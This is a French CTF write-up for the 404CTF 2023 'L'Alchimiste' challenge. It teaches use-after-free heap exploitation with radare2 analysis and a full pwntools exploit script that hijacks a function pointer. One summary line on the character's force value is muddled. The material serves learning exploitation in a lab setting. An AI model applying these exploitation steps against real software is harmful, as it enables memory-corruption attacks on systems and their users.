# Use-After-Free ‚Äî Heap Exploitation + Function Pointer Hijack

> üìÑ **Challenge r√©el : `L'Alchimiste` ‚Äî 404CTF 2023**

## Table des mati√®res
- [Pr√©requis](#pr√©requis)
- [Concepts cl√©s](#concepts-cl√©s)
- [Analyser le binaire](#analyser-le-binaire)
- [√âtape 1 ‚Äî Comprendre les structures en m√©moire](#√©tape-1--comprendre-les-structures-en-m√©moire)
- [√âtape 2 ‚Äî Identifier la vuln√©rabilit√© UAF](#√©tape-2--identifier-la-vuln√©rabilit√©-uaf)
- [√âtape 3 ‚Äî Construction du payload](#√©tape-3--construction-du-payload)
- [√âtape 4 ‚Äî Exploitation compl√®te](#√©tape-4--exploitation-compl√®te)
- [Sch√©ma r√©capitulatif](#sch√©ma-r√©capitulatif)
- [Erreurs fr√©quentes](#erreurs-fr√©quentes)
- [R√©sum√© des commandes utiles](#r√©sum√©-des-commandes-utiles)

---

## Pr√©requis

- Conna√Ætre les bases du langage C (pointeurs, structures)
- Comprendre ce qu'est le tas (heap) et la diff√©rence avec la pile (stack)
- Avoir `pwntools` install√© (`pip install pwntools`)
- Avoir `radare2` install√© pour l'analyse statique

---

## Concepts cl√©s

### Le tas (heap)

Le tas c'est une zone m√©moire g√©r√©e dynamiquement par le programme via `malloc()` et `free()`. Contrairement √† la pile qui est organis√©e et pr√©visible, le tas est g√©r√© par un **allocateur** (g√©n√©ralement `ptmalloc` sous Linux).

```
PILE (stack)          TAS (heap)
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ         ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚îÇ var locale ‚îÇ        ‚îÇ bloc A (malloc 72 octets)  ‚îÇ
‚îÇ canary     ‚îÇ        ‚îÇ bloc B (malloc 24 octets)  ‚îÇ
‚îÇ saved RBP  ‚îÇ        ‚îÇ bloc C (libre)             ‚îÇ ‚Üê free() laisse un trou
‚îÇ ret addr   ‚îÇ        ‚îÇ bloc D (malloc 72 octets)  ‚îÇ ‚Üê r√©utilise le trou de C !
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ         ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
```

> **R√®gle fondamentale de l'allocateur :** quand on fait `free()` puis un nouveau `malloc()` de la **m√™me taille**, l'allocateur retourne **le m√™me bloc m√©moire**.

### Le Use-After-Free (UAF)

Un UAF se produit quand :

1. On alloue un bloc ‚Üí `malloc()` ‚Üí pointeur P pointe vers le bloc
2. On lib√®re le bloc ‚Üí `free(P)` ‚Üí la m√©moire est rendue √† l'allocateur
3. **Le pointeur P n'est pas mis √† NULL** ‚Üí il pointe encore vers la zone lib√©r√©e
4. On r√©alloue un bloc de m√™me taille ‚Üí l'allocateur redonne le m√™me bloc
5. On √©crit dans le nouveau bloc ‚Üí **on √©crase ce que P croit encore lire**

```c
// Code vuln√©rable
char *ptr = malloc(72);    // ptr ‚Üí bloc √† 0x1234
free(ptr);                 // bloc lib√©r√© MAIS ptr vaut encore 0x1234 !
// ptr = NULL;             // ‚Üê cette ligne manque ‚Üí c'est le bug

char *buf = malloc(72);    // buf ‚Üí m√™me bloc √† 0x1234 (r√©utilis√© !)
strcpy(buf, "payload");    // on √©crit dans buf...
                           // ...mais ptr pointe au m√™me endroit !
use(ptr);                  // ptr lit notre payload ‚Üí exploitation !
```

### Le Function Pointer Hijack

Un **pointeur de fonction** c'est une variable qui contient l'adresse d'une fonction, et qu'on peut appeler comme une fonction normale :

```c
void (*func_ptr)(int) = &incStr;   // pointe vers incStr
func_ptr(arg);                      // appelle incStr(arg)

// Si on √©crase func_ptr avec l'adresse de incInt :
func_ptr = &incInt;                 // on redirige l'appel !
func_ptr(arg);                      // appelle incInt(arg) √† la place !
```

---

## Analyser le binaire

### Avec radare2

```bash
r2 ./binaire     # ouvrir le binaire
aaa              # analyse compl√®te
afl              # lister toutes les fonctions
```

### Ce qu'on cherche dans afl

On rep√®re les fonctions li√©es √† la gestion m√©moire :

```bash
afl | grep -E "malloc|free|create|buy|use|send"
```

Les fonctions importantes √† d√©sassembler :

```bash
pdf @ sym.createCharacter   # comment est construite la structure principale
pdf @ sym.buyStrUpPotion    # y a-t-il un malloc ? quelle taille ?
pdf @ sym.useItem           # y a-t-il un free ? le pointeur est-il mis √† NULL ?
pdf @ sym.sendMessage       # y a-t-il un malloc de m√™me taille ?
pdf @ sym.view_flag         # quelle condition pour avoir le flag ?
```

### V√©rifier les protections

```bash
checksec --file=./binaire
```

| Protection | Signification | Impact sur l'exploit |
|---|---|---|
| **NX enabled** | La pile n'est pas ex√©cutable | Pas de shellcode, on redirige vers du code existant |
| **No PIE** | Adresses fixes dans le binaire | Les adresses des fonctions sont connues √† l'avance |
| **Full RELRO** | La GOT est en lecture seule | On ne peut pas √©craser les entr√©es GOT |
| **Canary** | Protection de la pile | Sans impact direct sur un exploit heap |

---

## √âtape 1 ‚Äî Comprendre les structures en m√©moire

### Lire createCharacter

```asm
mov edi, 0x18          ‚Üê malloc(24 octets)
call sym.imp.malloc
mov dword [rax],    edi  ‚Üê +0x00 : force        (arg1)
mov dword [rax+4],  esi  ‚Üê +0x04 : intelligence (arg2)
mov dword [rax+8],  edx  ‚Üê +0x08 : or           (arg3)
mov qword [rax+16], 0    ‚Üê +0x10 : *potion = NULL
```

Ce qui donne la structure du personnage :

```
Structure personnage (malloc 0x18 = 24 octets)
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ +0x00 : force        (4 oct) ‚îÇ
‚îÇ +0x04 : intelligence (4 oct) ‚îÇ
‚îÇ +0x08 : or           (4 oct) ‚îÇ
‚îÇ +0x0C : (padding)    (4 oct) ‚îÇ
‚îÇ +0x10 : *potion      (8 oct) ‚îÇ ‚Üê pointeur vers la potion allou√©e
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### Lire buyStrUpPotion

```asm
mov edi, 0x48          ‚Üê malloc(72 octets)
call sym.imp.malloc
mov qword [rax],    "Elixir d"  ‚Üê +0x00 : nom de la potion
mov qword [rax+8],  "e force"   ‚Üê +0x08 : suite du nom
lea rdx, [sym.incStr]
mov qword [rax+0x40], rdx       ‚Üê +0x40 : pointeur de fonction ‚Üí incStr !
mov qword [perso+0x10], rax     ‚Üê stocke l'adresse dans perso->potion
```

Ce qui donne la structure de la potion :

```
Structure potion (malloc 0x48 = 72 octets)
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ +0x00 : "Elixir d"          (8 oct)  ‚îÇ
‚îÇ +0x08 : "e force"           (8 oct)  ‚îÇ
‚îÇ +0x10 : ...                          ‚îÇ
‚îÇ  ...                                 ‚îÇ
‚îÇ +0x40 : *fonction           (8 oct)  ‚îÇ ‚Üê pointeur de fonction ‚Üí incStr
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
         ‚Üë
         offset 64 depuis le d√©but = cyclic(64) pour atteindre ce pointeur
```

---

## √âtape 2 ‚Äî Identifier la vuln√©rabilit√© UAF

### Dans useItem

```asm
mov rax, [perso + 0x10]    ‚Üê charge le pointeur de potion
mov rax, [rax + 0x40]      ‚Üê charge le pointeur de fonction
call rax                    ‚Üê APPELLE la fonction (incStr par d√©faut)
...
mov rdi, [perso + 0x10]
call sym.imp.free           ‚Üê FREE la potion
                            ‚Üê MAIS perso->potion n'est PAS mis √† NULL !
```

> **C'est le bug :** apr√®s `free()`, `perso->potion` pointe encore vers la zone lib√©r√©e. Le programme ne fait pas `perso->potion = NULL`.

### Dans sendMessage

```asm
mov edi, 0x48              ‚Üê malloc(72 octets) ‚Äî M√äME TAILLE que la potion !
call sym.imp.malloc
...
call sym.imp.read          ‚Üê lit notre input dans le nouveau bloc
```

`sendMessage` fait un `malloc(0x48)` = **exactement la m√™me taille** que la potion. L'allocateur va donc retourner **le m√™me bloc** que celui lib√©r√© par `useItem`.

### La condition dans view_flag

```asm
cmp eax, 0x95    ‚Üê force > 149 ?
cmp eax, 0x95    ‚Üê intelligence > 149 ?
```

Il faut **force > 149 ET intelligence > 149** pour obtenir le flag. Le personnage d√©marre avec force=100 et intelligence=50 ‚Äî il faut donc augmenter l'intelligence de 100 points.

`incInt` ajoute `+10` √† l'intelligence √† chaque appel ‚Üí il faut l'appeler **au moins 10 fois** (10 √ó 10 = 100, 50+100 = 150 > 149).

---

## √âtape 3 ‚Äî Construction du payload

### Objectif

√âcraser le pointeur de fonction √† l'offset `+0x40` de la potion avec l'adresse de `incInt` au lieu de `incStr`.

### Calcul de l'offset

```
Taille totale de la potion : 0x48 = 72 octets
Offset du pointeur de fonction : 0x40 = 64 octets

‚Üí padding = cyclic(64)   pour remplir jusqu'√† +0x40
‚Üí puis p64(incInt)       pour √©craser le pointeur de fonction
```

### En code pwntools

```python
from pwn import *

exe = context.binary = ELF("./binaire")

win_addr = exe.symbols["incInt"]   # fonction qu'on veut appeler √† la place

payload = cyclic(64) + p64(win_addr)
#         ‚Üë                ‚Üë
#         64 octets        √©crase le pointeur de fonction √† +0x40
#         de padding
```

### Pourquoi cyclic(64) et pas b"A"*64 ?

`cyclic(64)` g√©n√®re un pattern reconnaissable (`aaaabaaacaaa...`). Si l'exploit plante, on peut identifier exactement quel octet a caus√© le crash dans GDB :

```bash
cyclic -l 0x61616166   # retrouve l'offset exact depuis la valeur crash√©e
```

---

## √âtape 4 ‚Äî Exploitation compl√®te

### D√©roul√© de l'attaque

```
PHASE 1 ‚Äî Chauffage du tas (150 √ó option1 + option2)
‚Üí On stabilise l'allocateur en cr√©ant/lib√©rant des blocs
‚Üí Le tas est dans un √©tat pr√©visible pour la suite

PHASE 2 ‚Äî Consommation du bloc r√©siduel (option3, payload neutre)
‚Üí Un premier sendMessage absorbe le dernier bloc libre r√©siduel
‚Üí On s'assure que la prochaine paire malloc/free sera bien align√©e

PHASE 3 ‚Äî Boucle d'exploitation (150 √ó option3 + payload + option2)
‚Üí sendMessage : malloc(0x48) ‚Üí nouveau bloc
‚Üí On √©crit cyclic(64) + p64(incInt) dedans
‚Üí useItem : lit perso->potion->fonction ‚Üí trouve incInt !
‚Üí call rax ‚Üí incInt(perso) ‚Üí +10 intelligence
‚Üí free(potion) ‚Üí bloc lib√©r√© ‚Üí pr√™t pour le prochain tour

PHASE 4 ‚Äî R√©cup√©ration du flag (option5)
‚Üí force=100 > 149 ? NON ‚Üí on a aussi augment√© la force via incStr au d√©part
‚Üí intelligence=150 > 149 ? OUI
‚Üí flag affich√© !
```

### Template d'exploit complet

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("./binaire")

host = "challenges.exemple.fr"
port = 12345

def start():
    if args.LOCAL:
        return process([exe.path])
    return remote(host, port)

io = start()
io.progress("Exploitation UAF en cours")

# ‚îÄ‚îÄ Phase 1 : chauffer le tas ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
# 150 √ó acheter une potion (malloc) puis la consommer (free)
for i in range(150):
    io.sendlineafter(b">>>", b"1")   # buyStrUpPotion ‚Üí malloc(0x48)
    io.sendlineafter(b">>>", b"2")   # useItem        ‚Üí free(potion)

# ‚îÄ‚îÄ Phase 2 : consommer le bloc r√©siduel ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
io.sendlineafter(b">>>", b"3")
io.sendlineafter(b": ", b"miaou")    # payload neutre, juste pour aligner le tas

# ‚îÄ‚îÄ Phase 3 : boucle d'exploitation ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
win_addr = exe.symbols["incInt"]
payload  = cyclic(64) + p64(win_addr)

for i in range(150):
    # sendMessage : malloc(0x48) ‚Üí re√ßoit le m√™me bloc que la potion lib√©r√©e
    io.sendlineafter(b">>>", b"3")
    io.sendlineafter(b": ", payload)   # on √©crase le pointeur de fonction

    # useItem : appelle perso->potion->fonction ‚Üí trouve incInt au lieu de incStr
    io.sendlineafter(b">>>", b"2")     # incInt(perso) ‚Üí +10 intelligence

# ‚îÄ‚îÄ Phase 4 : r√©cup√©rer le flag ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
io.sendlineafter(b">>>", b"5")         # view_flag : v√©rifie force > 149 et intel > 149
io.stream()
```

---

## Sch√©ma r√©capitulatif

```
√âTAT NORMAL (sans exploit)

  personnage                  potion
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê          ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ force=100      ‚îÇ          ‚îÇ "Elixir de force"    ‚îÇ
‚îÇ intel=50       ‚îÇ          ‚îÇ ...                  ‚îÇ
‚îÇ or=100         ‚îÇ          ‚îÇ +0x40 : ‚Üí incStr()   ‚îÇ ‚Üê augmente la FORCE
‚îÇ *potion ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ>‚îÇ                      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò          ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

APR√àS free(potion) ‚Äî LE BUG

  personnage                  tas
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê          ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ force=100      ‚îÇ          ‚îÇ [BLOC LIBRE 0x48]    ‚îÇ ‚Üê lib√©r√© mais...
‚îÇ intel=50       ‚îÇ          ‚îÇ                      ‚îÇ
‚îÇ or=100         ‚îÇ          ‚îÇ                      ‚îÇ
‚îÇ *potion ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ>‚îÇ (pointe encore ici!) ‚îÇ ‚Üê ...pointeur pas mis √† NULL !
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò          ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

APR√àS sendMessage ‚Äî L'EXPLOITATION

  personnage                  tas
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê          ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ force=100      ‚îÇ          ‚îÇ cyclic(64)           ‚îÇ ‚Üê notre padding
‚îÇ intel=50       ‚îÇ          ‚îÇ ...                  ‚îÇ
‚îÇ or=100         ‚îÇ          ‚îÇ +0x40 : ‚Üí incInt()   ‚îÇ ‚Üê on a √©cras√© incStr par incInt !
‚îÇ *potion ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ>‚îÇ                      ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò          ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

useItem lit *potion‚Üí+0x40 ‚Üí trouve incInt ‚Üí call rax ‚Üí +10 intelligence üéØ

FLUX D'ATTAQUE
1. malloc(potion) √ó 150    ‚Üí chauffer le tas
2. free(potion)  √ó 150     ‚Üí lib√©rer sans mettre √† NULL
3. sendMessage             ‚Üí malloc m√™me taille ‚Üí m√™me bloc ‚Üí √©craser le pointeur
4. useItem                 ‚Üí appelle incInt au lieu de incStr ‚Üí +10 intelligence
5. r√©p√©ter 150 fois        ‚Üí intelligence monte √† 150
6. view_flag               ‚Üí flag !
```

---

## Erreurs fr√©quentes

### Le malloc de sendMessage ne retombe pas sur le bon bloc
‚Üí Le tas n'est pas dans l'√©tat attendu. Augmenter le nombre d'it√©rations de chauffage ou v√©rifier avec GDB que les adresses malloc/free correspondent bien.

### L'intelligence n'augmente pas
‚Üí V√©rifier que le pointeur de fonction est bien √©cras√© au bon offset. Utiliser `cyclic_find()` pour confirmer l'offset exact si le programme crashe.

### view_flag dit "vous n'avez pas prouv√© votre valeur"
‚Üí V√©rifier les deux conditions : **force > 149 ET intelligence > 149**. Si la force n'est pas assez haute, il faut aussi appeler `buyStrUpPotion` + `useItem` normalement pour augmenter la force en parall√®le.

### Le programme crashe imm√©diatement
‚Üí V√©rifier que `context.binary` est bien d√©fini. V√©rifier que `p64()` est utilis√© (x64) et non `p32()`.

### La boucle sendMessage/useItem crashe au bout de N it√©rations
‚Üí L'allocateur a chang√© de comportement. Ajuster la phase de chauffage ou analyser avec GDB √† quel moment le bloc allou√© n'est plus le m√™me.

---

## R√©sum√© des commandes utiles

```bash
# Analyse statique
r2 ./binaire
aaa                          # analyse compl√®te
afl                          # liste les fonctions
afl | grep -E "malloc|free"  # rep√®re les fonctions m√©moire
pdf @ sym.createCharacter    # structure principale
pdf @ sym.buyStrUpPotion     # allocation de l'objet vuln√©rable
pdf @ sym.useItem            # free sans mise √† NULL ‚Üí bug UAF
pdf @ sym.sendMessage        # malloc m√™me taille ‚Üí r√©utilise le bloc

# V√©rifier les protections
checksec --file=./binaire

# Debug de l'exploit
./exploit.py LOCAL DEBUG      # en local avec logs d√©taill√©s
./exploit.py LOCAL NOASLR     # d√©sactive l'ASLR pour adresses fixes
./exploit.py GDB              # attache GDB automatiquement

# Dans GDB ‚Äî inspecter le tas
heap                          # avec GEF : affiche l'√©tat du tas
bins                          # affiche les blocs libres disponibles
x/16gx adresse                # inspecter 16 qwords √† une adresse
```

---

*Technique : Use-After-Free + Function Pointer Hijack*
*Architecture cible : x86-64 (amd64)*
*Outils : pwntools, radare2, GDB + GEF*
